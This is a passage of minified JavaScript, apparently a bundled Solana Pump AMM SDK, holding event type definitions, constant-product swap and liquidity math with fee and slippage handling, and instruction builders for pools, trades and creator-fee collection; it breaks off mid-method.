            { name: "user_quote_amount_out", type: "u64" },
            { name: "pool", type: "pubkey" },
            { name: "user", type: "pubkey" },
            { name: "user_base_token_account", type: "pubkey" },
            { name: "user_quote_token_account", type: "pubkey" },
            { name: "protocol_fee_recipient", type: "pubkey" },
            { name: "protocol_fee_recipient_token_account", type: "pubkey" },
            { name: "coin_creator", type: "pubkey" },
            { name: "coin_creator_fee_basis_points", type: "u64" },
            { name: "coin_creator_fee", type: "u64" },
          ],
        },
      },
      {
        name: "SetBondingCurveCoinCreatorEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "base_mint", type: "pubkey" },
            { name: "pool", type: "pubkey" },
            { name: "bonding_curve", type: "pubkey" },
            { name: "coin_creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "SetMetaplexCoinCreatorEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "base_mint", type: "pubkey" },
            { name: "pool", type: "pubkey" },
            { name: "metadata", type: "pubkey" },
            { name: "coin_creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "UpdateAdminEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "admin", type: "pubkey" },
            { name: "new_admin", type: "pubkey" },
          ],
        },
      },
      {
        name: "UpdateFeeConfigEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "admin", type: "pubkey" },
            { name: "lp_fee_basis_points", type: "u64" },
            { name: "protocol_fee_basis_points", type: "u64" },
            { name: "protocol_fee_recipients", type: { array: ["pubkey", 8] } },
            { name: "coin_creator_fee_basis_points", type: "u64" },
          ],
        },
      },
      {
        name: "WithdrawEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "lp_token_amount_in", type: "u64" },
            { name: "min_base_amount_out", type: "u64" },
            { name: "min_quote_amount_out", type: "u64" },
            { name: "user_base_token_reserves", type: "u64" },
            { name: "user_quote_token_reserves", type: "u64" },
            { name: "pool_base_token_reserves", type: "u64" },
            { name: "pool_quote_token_reserves", type: "u64" },
            { name: "base_amount_out", type: "u64" },
            { name: "quote_amount_out", type: "u64" },
            { name: "lp_mint_supply", type: "u64" },
            { name: "pool", type: "pubkey" },
            { name: "user", type: "pubkey" },
            { name: "user_base_token_account", type: "pubkey" },
            { name: "user_quote_token_account", type: "pubkey" },
            { name: "user_pool_token_account", type: "pubkey" },
          ],
        },
      },
    ],
  };
  function $m(t, e) {
    if (e.isZero()) throw new Error("Cannot divide by zero.");
    return t.add(e.subn(1)).div(e);
  }
  function tg(t, e) {
    return $m(t.mul(e), new Zn(1e4));
  }
  function eg(t, e = Vm) {
    const n = { ...Qm };
    return (n.address = e), new jm(n, new Vf(t, null, {}));
  }
  var ng = new Zn(1e4);
  function rg(t, e, n, r, o, i) {
    if (n.isZero() || r.isZero())
      throw new Error(
        "Invalid input: 'baseReserve' or 'quoteReserve' cannot be zero."
      );
    if (t.gt(r))
      throw new Error(
        "Cannot receive more quote tokens than the pool quote reserves."
      );
    const s = (function (t, e, n, r) {
      const o = e.add(n).add(r),
        i = ng.sub(o);
      return $m(t.mul(ng), i);
    })(
      t,
      o.lpFeeBasisPoints,
      o.protocolFeeBasisPoints,
      Xi.default.equals(i) ? new Zn(0) : o.coinCreatorFeeBasisPoints
    );
    if (s.gte(r))
      throw new Error(
        "Invalid input: Desired quote amount exceeds available reserve."
      );
    const a = $m(n.mul(s), r.sub(s)),
      u = new Zn(1e9),
      c = 1e9 * (1 - e / 100),
      l = new Zn(Math.floor(c));
    return { internalRawQuote: s, base: a, minQuote: t.mul(l).div(u) };
  }
  var og = class {
      constructor(t, e = Vm) {
        (this.connection = t),
          (this.program = eg(t, e)),
          (this.offlineProgram = eg(null, e)),
          (this.globalConfig = (function (t = Hm) {
            return Xi.findProgramAddressSync([ct.from("global_config")], t);
          })(this.offlineProgram.programId)[0]);
      }
      programId() {
        return this.offlineProgram.programId;
      }
      globalConfigKey() {
        return this.globalConfig;
      }
      poolKey(t, e, n, r) {
        return Xm(t, e, n, r, this.offlineProgram.programId);
      }
      lpMintKey(t) {
        return (function (t, e = Hm) {
          return Xi.findProgramAddressSync(
            [ct.from("pool_lp_mint"), t.toBuffer()],
            e
          );
        })(t, this.offlineProgram.programId);
      }
      fetchGlobalConfigAccount() {
        return this.program.account.globalConfig.fetch(this.globalConfig);
      }
      fetchPool(t) {
        return this.program.account.pool.fetch(t);
      }
      decodeGlobalConfig(t) {
        return this.offlineProgram.coder.accounts.decode(
          "globalConfig",
          t.data
        );
      }
      decodePool(t) {
        return this.offlineProgram.coder.accounts.decode("pool", t.data);
      }
      async createPoolInstructionsInternal(t, e, n) {
        const {
          index: r,
          creator: o,
          baseMint: i,
          quoteMint: s,
          poolKey: a,
          baseTokenProgram: u,
          quoteTokenProgram: c,
          userBaseTokenAccount: l,
          userQuoteTokenAccount: d,
          poolBaseTokenAccount: f,
          poolQuoteTokenAccount: h,
          userBaseAccountInfo: p,
          userQuoteAccountInfo: m,
          poolBaseAccountInfo: g,
          poolQuoteAccountInfo: y,
        } = t;
        return await this.withWsolAccounts(
          o,
          i,
          l,
          this.accountExists(p, u),
          e,
          s,
          d,
          this.accountExists(m, c),
          n,
          async () => {
            const t = [];
            return (
              this.accountExists(g, u) || t.push(bl(o, f, a, i, u)),
              this.accountExists(y, c) || t.push(bl(o, h, a, s, c)),
              t.push(
                await this.offlineProgram.methods
                  .createPool(r, e, n, Fs.programId)
                  .accountsPartial({
                    globalConfig: this.globalConfig,
                    baseMint: i,
                    quoteMint: s,
                    creator: o,
                    userBaseTokenAccount: l,
                    userQuoteTokenAccount: d,
                    baseTokenProgram: u,
                    quoteTokenProgram: c,
                  })
                  .instruction()
              ),
              t
            );
          }
        );
      }
      async depositInstructionsInternal(t, e, n, r) {
        const {
            pool: o,
            user: i,
            userPoolAccountInfo: s,
            userBaseTokenAccount: a,
            userQuoteTokenAccount: u,
            userPoolTokenAccount: c,
            userBaseAccountInfo: l,
            userQuoteAccountInfo: d,
            baseTokenProgram: f,
            quoteTokenProgram: h,
          } = t,
          { baseMint: p, quoteMint: m, lpMint: g } = o,
          y = this.liquidityAccounts(t);
        return await this.withFixPoolInstructions(
          t,
          async () =>
            await this.withWsolAccounts(
              i,
              p,
              a,
              this.accountExists(l, f),
              n,
              m,
              u,
              this.accountExists(d, h),
              r,
              async () => {
                const t = [];
                return (
                  this.accountExists(s, Tc) || t.push(bl(i, c, i, g, Tc)),
                  t.push(
                    await this.offlineProgram.methods
                      .deposit(e, n, r)
                      .accounts(y)
                      .instruction()
                  ),
                  t
                );
              }
            )
        );
      }
      async withWsolAccounts(t, e, n, r, o, i, s, a, u, c) {
        return await this.withWsolAccount(t, t, e, n, r, o, async () =>
          this.withWsolAccount(t, t, i, s, a, u, c)
        );
      }
      async withWsolAccount(t, e, n, r, o, i, s, a = !0) {
        const u = [];
        n.equals(Bc) &&
          (o || u.push(bl(t, r, e, Bc)),
          i.gtn(0) &&
            u.push(
              Fs.transfer({
                fromPubkey: e,
                toPubkey: r,
                lamports: BigInt(i.toString()),
              }),
              (function (t, e = _c) {
                const n = [{ pubkey: t, isSigner: !1, isWritable: !0 }],
                  r = ct.alloc(Al.span);
                return (
                  Al.encode({ instruction: jc.SyncNative }, r),
                  new ws({ keys: n, programId: e, data: r })
                );
              })(r)
            ));
        const c = await s();
        return (
          u.push(...c), n.equals(Bc) && a && u.push(ml(r, e, e, void 0, _c)), u
        );
      }
      accountExists(t, e) {
        return null !== t && t.owner.equals(e);
      }
      depositBaseInputInternal(t, e, n) {
        const {
            pool: r,
            poolBaseTokenAccount: o,
            poolQuoteTokenAccount: i,
          } = t,
          {
            token1: s,
            lpToken: a,
            maxToken0: u,
            maxToken1: c,
          } = Jm(
            e,
            n,
            new Zn(o.amount.toString()),
            new Zn(i.amount.toString()),
            r.lpSupply
          );
        return { quote: s, lpToken: a, maxBase: u, maxQuote: c };
      }
      depositQuoteInputInternal(t, e, n) {
        const {
            pool: r,
            poolBaseTokenAccount: o,
            poolQuoteTokenAccount: i,
          } = t,
          {
            token1: s,
            lpToken: a,
            maxToken0: u,
            maxToken1: c,
          } = Jm(
            e,
            n,
            new Zn(i.amount.toString()),
            new Zn(o.amount.toString()),
            r.lpSupply
          );
        return { base: s, lpToken: a, maxBase: c, maxQuote: u };
      }
      async withdrawInstructionsInternal(t, e, n, r) {
        const {
            pool: o,
            baseTokenProgram: i,
            quoteTokenProgram: s,
            user: a,
            userBaseAccountInfo: u,
            userQuoteAccountInfo: c,
            userBaseTokenAccount: l,
            userQuoteTokenAccount: d,
          } = t,
          { baseMint: f, quoteMint: h } = o,
          p = this.liquidityAccounts(t);
        return await this.withFixPoolInstructions(t, async () => {
          const t = [];
          let o = !1;
          this.accountExists(u, i) ||
            (t.push(bl(a, l, a, f, i)), f.equals(Bc) && (o = !0));
          let m = !1;
          return (
            this.accountExists(c, s) ||
              (t.push(bl(a, d, a, h, s)), h.equals(Bc) && (m = !0)),
            t.push(
              await this.offlineProgram.methods
                .withdraw(e, n, r)
                .accounts(p)
                .instruction()
            ),
            o && t.push(ml(l, a, a, void 0, _c)),
            m && t.push(ml(d, a, a, void 0, _c)),
            t
          );
        });
      }
      withdrawInputsInternal(t, e, n) {
        const {
          pool: r,
          poolBaseTokenAccount: o,
          poolQuoteTokenAccount: i,
        } = t;
        return (function (t, e, n, r, o) {
          if (t.isZero() || o.isZero())
            throw new Error("LP amount or total LP tokens cannot be zero.");
          const i = n.mul(t).div(o),
            s = r.mul(t).div(o),
            a = new Zn(1e9),
            u = new Zn(1e9 * (1 - e / 100)),
            c = i.mul(u).div(a),
            l = s.mul(u).div(a);
          return { base: i, quote: s, minBase: c, minQuote: l };
        })(
          e,
          n,
          new Zn(o.amount.toString()),
          new Zn(i.amount.toString()),
          r.lpSupply
        );
      }
      liquidityAccounts(t) {
        const {
            poolKey: e,
            pool: n,
            user: r,
            userBaseTokenAccount: o,
            userQuoteTokenAccount: i,
            userPoolTokenAccount: s,
          } = t,
          {
            baseMint: a,
            quoteMint: u,
            lpMint: c,
            poolBaseTokenAccount: l,
            poolQuoteTokenAccount: d,
          } = n;
        let f = this.programId(),
          [h] = Zm(f);
        return {
          pool: e,
          globalConfig: this.globalConfig,
          user: r,
          baseMint: a,
          quoteMint: u,
          lpMint: c,
          userBaseTokenAccount: o,
          userQuoteTokenAccount: i,
          userPoolTokenAccount: s,
          poolBaseTokenAccount: l,
          poolQuoteTokenAccount: d,
          tokenProgram: _c,
          token2022Program: Tc,
          eventAuthority: h,
          program: f,
        };
      }
      async buyInstructionsInternal(t, e, n) {
        return await this.withFixPoolInstructions(
          t,
          async () => await this.buyInstructionsInternalNoPool(t, e, n)
        );
      }
      async createPoolSolanaState(t, e, n, r, o = void 0, i = void 0) {
        const [s, a, u] = await this.connection.getMultipleAccountsInfo([
          this.globalConfig,
          n,
          r,
        ]);
        if (null === s) throw new Error("Global config account not found");
        if (null === a) throw new Error(`baseMint=${n.toString()} not found`);
        if (null === u) throw new Error(`quoteMint=${r.toString()} not found`);
        const c = this.decodeGlobalConfig(s),
          [l, d] = [a.owner, u.owner],
          [f] = Xm(t, e, n, r, this.offlineProgram.programId),
          h = hl(n, f, !0, l),
          p = hl(r, f, !0, d),
          [m, g] = await this.connection.getMultipleAccountsInfo([h, p]);
        void 0 === o && (o = hl(n, e, !0, l)),
          void 0 === i && (i = hl(r, e, !0, d));
        const [y, w] = await this.connection.getMultipleAccountsInfo([o, i]);
        return {
          index: t,
          creator: e,
          baseMint: n,
          quoteMint: r,
          globalConfig: c,
          poolKey: f,
          poolBaseTokenAccount: h,
          poolQuoteTokenAccount: p,
          baseTokenProgram: l,
          quoteTokenProgram: d,
          userBaseTokenAccount: o,
          userQuoteTokenAccount: i,
          userBaseAccountInfo: y,
          userQuoteAccountInfo: w,
          poolBaseAccountInfo: m,
          poolQuoteAccountInfo: g,
        };
      }
      async swapSolanaState(t, e, n = void 0, r = void 0) {
        const [o, i] = await this.connection.getMultipleAccountsInfo([
          this.globalConfig,
          t,
        ]);
        if (null === o) throw new Error("Global config account not found");
        if (null === i) throw new Error("Pool account not found");
        const s = this.decodeGlobalConfig(o),
          a = this.decodePool(i),
          {
            baseMint: u,
            quoteMint: c,
            poolBaseTokenAccount: l,
            poolQuoteTokenAccount: d,
          } = a,
          [f, h, p, m] = await this.connection.getMultipleAccountsInfo([
            u,
            c,
            l,
            d,
          ]);
        if (null === f) throw new Error(`baseMint=${u.toString()} not found`);
        if (null === h) throw new Error(`quoteMint=${c.toString()} not found`);
        if (null === p)
          throw new Error(`Pool base token account ${l.toString()} not found`);
        if (null === m)
          throw new Error(`Pool quote token account ${d.toString()} not found`);
        const [g, y] = [f.owner, h.owner],
          w = Yc.decode(p.data),
          b = Yc.decode(m.data);
        void 0 === n && (n = hl(u, e, !0, g)),
          void 0 === r && (r = hl(c, e, !0, y));
        const [v, A] = await this.connection.getMultipleAccountsInfo([n, r]);
        return {
          globalConfig: s,
          poolKey: t,
          poolAccountInfo: i,
          pool: a,
          poolBaseAmount: new Zn(w.amount.toString()),
          poolQuoteAmount: new Zn(b.amount.toString()),
          baseTokenProgram: g,
          quoteTokenProgram: y,
          user: e,
          userBaseTokenAccount: n,
          userQuoteTokenAccount: r,
          userBaseAccountInfo: v,
          userQuoteAccountInfo: A,
        };
      }
      async swapSolanaStateNoPool(t, e, n = void 0, r = void 0) {
        const [o, i] = await this.connection.getMultipleAccountsInfo([
          this.globalConfig,
          t,
        ]);
        if (null === o) throw new Error("Global config account not found");
        if (null === i) throw new Error("Pool account not found");
        const s = this.decodeGlobalConfig(o),
          a = this.decodePool(i),
          {
            baseMint: u,
            quoteMint: c,
            poolBaseTokenAccount: l,
            poolQuoteTokenAccount: d,
          } = a,
          [f, h, p, m] = await this.connection.getMultipleAccountsInfo([
            u,
            c,
            l,
            d,
          ]);
        if (null === f) throw new Error(`baseMint=${u.toString()} not found`);
        if (null === h) throw new Error(`quoteMint=${c.toString()} not found`);
        if (null === p)
          throw new Error(`Pool base token account ${l.toString()} not found`);
        if (null === m)
          throw new Error(`Pool quote token account ${d.toString()} not found`);
        const [g, y] = [f.owner, h.owner],
          w = Yc.decode(p.data),
          b = Yc.decode(m.data);
        void 0 === n && (n = hl(u, e, !0, g)),
          void 0 === r && (r = hl(c, e, !0, y));
        const [v, A] = await this.connection.getMultipleAccountsInfo([n, r]);
        return {
          globalConfig: s,
          poolKey: t,
          poolAccountInfo: i,
          pool: a,
          poolBaseAmount: new Zn(w.amount.toString()),
          poolQuoteAmount: new Zn(b.amount.toString()),
          baseTokenProgram: g,
          quoteTokenProgram: y,
          user: e,
          userBaseTokenAccount: n,
          userQuoteTokenAccount: r,
          userBaseAccountInfo: v,
          userQuoteAccountInfo: A,
        };
      }
      async liquiditySolanaState(t, e, n = void 0, r = void 0, o = void 0) {
        const [i, s] = await this.connection.getMultipleAccountsInfo([
          this.globalConfig,
          t,
        ]);
        if (null === i) throw new Error("Global config account not found");
        if (null === s) throw new Error("Pool account not found");
        const a = this.decodeGlobalConfig(i),
          u = this.decodePool(s),
          {
            baseMint: c,
            quoteMint: l,
            lpMint: d,
            poolBaseTokenAccount: f,
            poolQuoteTokenAccount: h,
          } = u,
          [p, m, g, y] = await this.connection.getMultipleAccountsInfo([
            c,
            l,
            f,
            h,
          ]);
        if (null === p) throw new Error(`baseMint=${c.toString()} not found`);
        if (null === m) throw new Error(`quoteMint=${l.toString()} not found`);
        if (null === g)
          throw new Error(`Pool base token account ${f.toString()} not found`);
        if (null === y)
          throw new Error(`Pool quote token account ${h.toString()} not found`);
        const [w, b] = [p.owner, m.owner],
          v = Yc.decode(g.data),
          A = Yc.decode(y.data);
        void 0 === n && (n = hl(c, e, !0, w)),
          void 0 === r && (r = hl(l, e, !0, b)),
          void 0 === o && (o = hl(d, e, !0, Tc));
        const [k, I, S] = await this.connection.getMultipleAccountsInfo([
          n,
          r,
          o,
        ]);
        return {
          globalConfig: a,
          poolKey: t,
          poolAccountInfo: s,
          pool: u,
          poolBaseTokenAccount: v,
          poolQuoteTokenAccount: A,
          baseTokenProgram: w,
          quoteTokenProgram: b,
          user: e,
          userBaseTokenAccount: n,
          userQuoteTokenAccount: r,
          userPoolTokenAccount: o,
          userBaseAccountInfo: k,
          userQuoteAccountInfo: I,
          userPoolAccountInfo: S,
        };
      }
      async buyInstructionsInternalNoPool(t, e, n) {
        const { userBaseAccountInfo: r, userQuoteAccountInfo: o } = t,
          i = this.swapAccounts(t),
          {
            user: s,
            baseMint: a,
            quoteMint: u,
            userBaseTokenAccount: c,
            userQuoteTokenAccount: l,
            baseTokenProgram: d,
            quoteTokenProgram: f,
          } = i;
        return this.withWsolAccount(
          s,
          s,
          u,
          l,
          this.accountExists(o, f),
          n,
          async () => {
            const t = [];
            return (
              this.accountExists(r, d) || t.push(bl(s, c, s, a, d)),
              t.push(
                await this.offlineProgram.methods
                  .buy(e, n)
                  .accounts(i)
                  .instruction()
              ),
              a.equals(Bc) && t.push(ml(c, s, s, void 0, _c)),
              t
            );
          }
        );
      }
      async buyBaseInput(t, e, n) {
        const { maxQuote: r } = this.buyBaseInputInternal(t, e, n);
        return this.buyInstructionsInternal(t, e, r);
      }
      async buyQuoteInput(t, e, n) {
        const { base: r, maxQuote: o } = this.buyQuoteInputInternal(t, e, n);
        return this.buyInstructionsInternal(t, r, o);
      }
      buyAutocompleteQuoteFromBase(t, e, n) {
        const { uiQuote: r } = this.buyBaseInputInternal(t, e, n);
        return r;
      }
      buyAutocompleteBaseFromQuote(t, e, n) {
        const { base: r } = this.buyQuoteInputInternal(t, e, n);
        return r;
      }
      buyBaseInputInternal(t, e, n) {
        const {
          pool: r,
          globalConfig: o,
          poolBaseAmount: i,
          poolQuoteAmount: s,
        } = t;
        return (function (t, e, n, r, o, i) {
          if (n.isZero() || r.isZero())
            throw new Error(
              "Invalid input: 'baseReserve' or 'quoteReserve' cannot be zero."
            );
          if (t.gt(n))
            throw new Error(
              "Cannot buy more base tokens than the pool reserves."
            );
          const s = r.mul(t),
            a = n.sub(t);
          if (a.isZero())
            throw new Error("Pool would be depleted; denominator is zero.");
          const u = $m(s, a),
            c = tg(u, o.lpFeeBasisPoints),
            l = tg(u, o.protocolFeeBasisPoints),
            d = Xi.default.equals(i)
              ? new Zn(0)
              : tg(u, o.coinCreatorFeeBasisPoints),
            f = u.add(c).add(l).add(d),
            h = new Zn(1e9),
            p = 1e9 * (1 + e / 100),
            m = new Zn(Math.floor(p)),
            g = f.mul(m).div(h);
          return { internalQuoteAmount: u, uiQuote: f, maxQuote: g };
        })(e, n, i, s, o, r.coinCreator);
      }
      buyQuoteInputInternal(t, e, n) {
        const {
          globalConfig: r,
          pool: o,
          poolBaseAmount: i,
          poolQuoteAmount: s,
        } = t;
        return (function (t, e, n, r, o, i) {
          if (n.isZero() || r.isZero())
            throw new Error(
              "Invalid input: 'baseReserve' or 'quoteReserve' cannot be zero."
            );
          const s = o.lpFeeBasisPoints
              .add(o.protocolFeeBasisPoints)
              .add(
                Xi.default.equals(i) ? new Zn(0) : o.coinCreatorFeeBasisPoints
              ),
            a = new Zn(1e4).add(s),
            u = t.mul(new Zn(1e4)).div(a),
            c = n.mul(u),
            l = r.add(u);
          if (l.isZero())
            throw new Error("Pool would be depleted; denominator is zero.");
          const d = c.div(l),
            f = new Zn(1e9),
            h = 1e9 * (1 + e / 100),
            p = new Zn(Math.floor(h));
          return {
            base: d,
            internalQuoteWithoutFees: u,
            maxQuote: t.mul(p).div(f),
          };
        })(e, n, i, s, r, o.coinCreator);
      }
      async sellInstructionsInternal(t, e, n) {
        return await this.withFixPoolInstructions(
          t,
          async () => await this.sellInstructionsInternalNoPool(t, e, n)
        );
      }
      async withFixPoolInstructions(t, e) {
        const { poolAccountInfo: n, poolKey: r, user: o } = t,
          i = [];
        return (
          (null === n || n.data.length < 300) &&
            i.push(
              await this.offlineProgram.methods
                .extendAccount()
                .accountsPartial({ account: r, user: o })
                .instruction()
            ),
          [...i, ...(await e())]
        );
      }
      async sellInstructionsInternalNoPool(t, e, n) {
        const { userBaseAccountInfo: r, userQuoteAccountInfo: o } = t,
          i = this.swapAccounts(t),
          {
            user: s,
            baseMint: a,
            quoteMint: u,
            userBaseTokenAccount: c,
            userQuoteTokenAccount: l,
            baseTokenProgram: d,
            quoteTokenProgram: f,
          } = i;
        return this.withWsolAccount(
          s,
          s,
          a,
          c,
          this.accountExists(r, d),
          e,
          async () => {
            const t = [];
            return (
              this.accountExists(o, f) || t.push(bl(s, l, s, u, f)),
              t.push(
                await this.offlineProgram.methods
                  .sell(e, n)
                  .accounts(i)
                  .instruction()
              ),
              u.equals(Bc) && t.push(ml(l, s, s, void 0, _c)),
              t
            );
          }
        );
      }
      async sellBaseInput(t, e, n) {
        const { minQuote: r } = this.sellBaseInputInternal(t, e, n);
        return this.sellInstructionsInternal(t, e, r);
      }
      async sellQuoteInput(t, e, n) {
        const { base: r, minQuote: o } = this.sellQuoteInputInternal(t, e, n);
        return this.sellInstructionsInternal(t, r, o);
      }
      sellAutocompleteQuoteFromBase(t, e, n) {
        const { uiQuote: r } = this.sellBaseInputInternal(t, e, n);
        return r;
      }
      sellAutocompleteBaseFromQuote(t, e, n) {
        const { base: r } = this.sellQuoteInputInternal(t, e, n);
        return r;
      }
      sellBaseInputInternal(t, e, n) {
        const {
          globalConfig: r,
          pool: o,
          poolBaseAmount: i,
          poolQuoteAmount: s,
        } = t;
        return (function (t, e, n, r, o, i) {
          if (n.isZero() || r.isZero())
            throw new Error(
              "Invalid input: 'baseReserve' or 'quoteReserve' cannot be zero."
            );
          const s = r.mul(t).div(n.add(t)),
            a = tg(s, o.lpFeeBasisPoints),
            u = tg(s, o.protocolFeeBasisPoints),
            c = Xi.default.equals(i)
              ? new Zn(0)
              : tg(s, o.coinCreatorFeeBasisPoints),
            l = s.sub(a).sub(u).sub(c);
          if (l.isNeg())
            throw new Error(
              "Fees exceed total output; final quote is negative."
            );
          const d = new Zn(1e9),
            f = 1e9 * (1 - e / 100),
            h = new Zn(Math.floor(f)),
            p = l.mul(h).div(d);
          return { uiQuote: l, minQuote: p, internalQuoteAmountOut: s };
        })(e, n, i, s, r, o.coinCreator);
      }
      sellQuoteInputInternal(t, e, n) {
        const {
          globalConfig: r,
          pool: o,
          poolBaseAmount: i,
          poolQuoteAmount: s,
        } = t;
        return rg(e, n, i, s, r, o.coinCreator);
      }
      async extendAccount(t, e) {
        return this.offlineProgram.methods
          .extendAccount()
          .accountsPartial({ account: t, user: e })
          .instruction();
      }
      async collectCoinCreatorFeeSolanaState(t, e = void 0) {
        const n = Bc,
          r = _c;
        let o = this.coinCreatorVaultAuthorityPda(t),
          i = this.coinCreatorVaultAta(o, n, r);
        void 0 === e && (e = hl(n, t, !0, r));
        const [s, a] = await this.connection.getMultipleAccountsInfo([i, e]);
        return {
          coinCreator: t,
          quoteMint: n,
          quoteTokenProgram: r,
          coinCreatorVaultAuthority: o,
          coinCreatorVaultAta: i,
          coinCreatorTokenAccount: e,
          coinCreatorVaultAtaAccountInfo: s,
          coinCreatorTokenAccountInfo: a,
        };
      }
      async collectCoinCreatorFee(t) {
        const {
          coinCreator: e,
          quoteMint: n,
          quoteTokenProgram: r,
          coinCreatorVaultAuthority: o,
          coinCreatorVaultAta: i,
          coinCreatorTokenAccount: s,
          coinCreatorVaultAtaAccountInfo: a,
          coinCreatorTokenAccountInfo: u,
        } = t;
        return await this.withWsolAccount(
          e,
          o,
          n,
          i,
          this.accountExists(a, r),
          new Zn(0),
          async () =>
            await this.withWsolAccount(
              e,
              e,
              n,
              s,
              this.accountExists(u, r),
              new Zn(0),
              async () => [
                await this.offlineProgram.methods
                  .collectCoinCreatorFee()
                  .accountsPartial({
                    coinCreator: e,
                    coinCreatorTokenAccount: s,
                    quoteMint: n,
                    quoteTokenProgram: r,
                  })
                  .instruction(),
              ]
            ),
          !1
        );
      }
      async getCoinCreatorVaultBalance(t) {
        const e = Bc,
          n = _c,
          r = this.coinCreatorVaultAuthorityPda(t),
          o = this.coinCreatorVaultAta(r, e, n);
        try {
          const t = await $c(this.connection, o, void 0, n);
          return new Zn(t.amount.toString());
        } catch (i) {
          return void 0, new Zn(0);
        }
      }
      async setCoinCreator(t) {
        return this.offlineProgram.methods
          .setCoinCreator()
          .accountsPartial({ pool: t })
          .instruction();
      }
      swapAccounts(t) {
        const {
            globalConfig: e,
            poolKey: n,
            pool: r,
            baseTokenProgram: o,
            quoteTokenProgram: i,
            user: s,
            userBaseTokenAccount: a,
            userQuoteTokenAccount: u,
          } = t,
          { protocolFeeRecipients: c } = e,
          l = c[Math.floor(Math.random() * c.length)],
          {
            baseMint: d,
            quoteMint: f,
            poolBaseTokenAccount: h,
            poolQuoteTokenAccount: p,
            coinCreator: m,
          } = r,
          g = this.coinCreatorVaultAuthorityPda(m);
        let y = this.programId(),
          [w] = Zm(y);
        return {
          pool: n,
          globalConfig: this.globalConfig,
          user: s,
          baseMint: d,
          quoteMint: f,
          userBaseTokenAccount: a,
          userQuoteTokenAccount: u,
          poolBaseTokenAccount: h,
          poolQuoteTokenAccount: p,
          protocolFeeRecipient: l,
          protocolFeeRecipientTokenAccount: hl(f, l, !0, i),
          baseTokenProgram: o,
          quoteTokenProgram: i,
          systemProgram: Fs.programId,
          associatedTokenProgram: Cc,
          eventAuthority: w,
          program: y,
          coinCreatorVaultAta: this.coinCreatorVaultAta(g, f, i),
          coinCreatorVaultAuthority: g,
        };
      }
      coinCreatorVaultAuthorityPda(t) {
        const [e] = Xi.findProgramAddressSync(
          [ct.from("creator_vault"), t.toBuffer()],
          this.programId()
        );
        return e;
      }
      coinCreatorVaultAta(t, e, n) {
        return hl(e, t, !0, n);
      }
    },
    ig = class {
      constructor(t, e = Vm) {
        this.pumpAmmInternalSdk = new og(t, e);
      }
      programId() {
        return this.pumpAmmInternalSdk.programId();
      }
      globalConfigKey() {
        return this.pumpAmmInternalSdk.globalConfigKey();
      }
      poolKey(t, e, n, r) {
        return this.pumpAmmInternalSdk.poolKey(t, e, n, r);
      }
      lpMintKey(t) {
        return this.pumpAmmInternalSdk.lpMintKey(t);
      }
      fetchGlobalConfigAccount() {
        return this.pumpAmmInternalSdk.fetchGlobalConfigAccount();
      }
      fetchPool(t) {
        return this.pumpAmmInternalSdk.fetchPool(t);
      }
      decodeGlobalConfig(t) {
        return this.pumpAmmInternalSdk.decodeGlobalConfig(t);
      }
      decodePool(t) {
        return this.pumpAmmInternalSdk.decodePool(t);
      }
      async createPoolInstructions(t, e, n) {
        return this.pumpAmmInternalSdk.createPoolInstructionsInternal(t, e, n);
      }
      async createAutocompleteInitialPoolPrice(t, e) {
        return e.div(t);
      }
      async depositInstructions(t, e, n) {
        const {
            pool: r,
            poolBaseTokenAccount: o,
            poolQuoteTokenAccount: i,
          } = t,
          { maxBase: s, maxQuote: a } = (function (t, e, n, r, o) {
            if (o.isZero())
              throw new Error("Division by zero: totalLpTokens cannot be zero");
            const i = Ym(n.mul(t), o),
              s = Ym(r.mul(t), o),
              a = new Zn(1e9 * (1 + e / 100)),
              u = new Zn(1e9);
            return { maxBase: i.mul(a).div(u), maxQuote: s.mul(a).div(u) };
          })(
            e,
            n,
            new Zn(o.amount.toString()),
            new Zn(i.amount.toString()),
            r.lpSupply
          );
        return this.pumpAmmInternalSdk.depositInstructionsInternal(t, e, s, a);
      }
      depositAutocompleteQuoteAndLpTokenFromBase(t, e, n) {
        const { quote: r, lpToken: o } =
          this.pumpAmmInternalSdk.depositBaseInputInternal(t, e, n);
        return { quote: r, lpToken: o };
      }
      depositAutocompleteBaseAndLpTokenFromQuote(t, e, n) {
        const { base: r, lpToken: o } =
          this.pumpAmmInternalSdk.depositQuoteInputInternal(t, e, n);
        return { base: r, lpToken: o };
      }
      async withdrawInstructions(t, e, n) {
        const { minBase: r, minQuote: o } =
          this.pumpAmmInternalSdk.withdrawInputsInternal(t, e, n);
        return this.pumpAmmInternalSdk.withdrawInstructionsInternal(t, e, r, o);
      }
      withdrawAutoCompleteBaseAndQuoteFromLpToken(t, e, n) {
        const { base: r, quote: o } =
          this.pumpAmmInternalSdk.withdrawInputsInternal(t, e, n);
        return { base: r, quote: o };
      }
      async swapBaseInstructions(t, e, n, r) {
        return "quoteToBase" == r
          ? await this.pumpAmmInternalSdk.buyBaseInput(t, e, n)
          : await this.pumpAmmInternalSdk.sellBaseInput(t, e, n);
      }
      async swapQuoteInstructions(t, e, n, r) {
        return "quoteToBase" == r
          ? await this.pumpAmmInternalSdk.buyQuoteInput(t, e, n)
          : await this.pumpAmmInternalSdk.sellQuoteInput(t, e, n);
      }
      swapAutocompleteQuoteFromBase(t, e, n, r) {
        return "quoteToBase" == r
          ? this.pumpAmmInternalSdk.buyAutocompleteQuoteFromBase(t, e, n)
          : this.pumpAmmInternalSdk.sellAutocompleteQuoteFromBase(t, e, n);
      }
      swapAutocompleteBaseFromQuote(t, e, n, r) {
        return "quoteToBase" == r
          ? this.pumpAmmInternalSdk.buyAutocompleteBaseFromQuote(t, e, n)
          : this.pumpAmmInternalSdk.sellAutocompleteBaseFromQuote(t, e, n);
      }
      async extendAccount(t, e) {
        return this.pumpAmmInternalSdk.extendAccount(t, e);
      }
      async collectCoinCreatorFee(t) {
        return this.pumpAmmInternalSdk.collectCoinCreatorFee(t);
      }
      async getCoinCreatorVaultBalance(t) {
        return this.pumpAmmInternalSdk.getCoinCreatorVaultBalance(t);
      }
      coinCreatorVaultAuthorityPda(t) {
        return this.pumpAmmInternalSdk.coinCreatorVaultAuthorityPda(t);
      }
      coinCreatorVaultAta(t, e, n) {
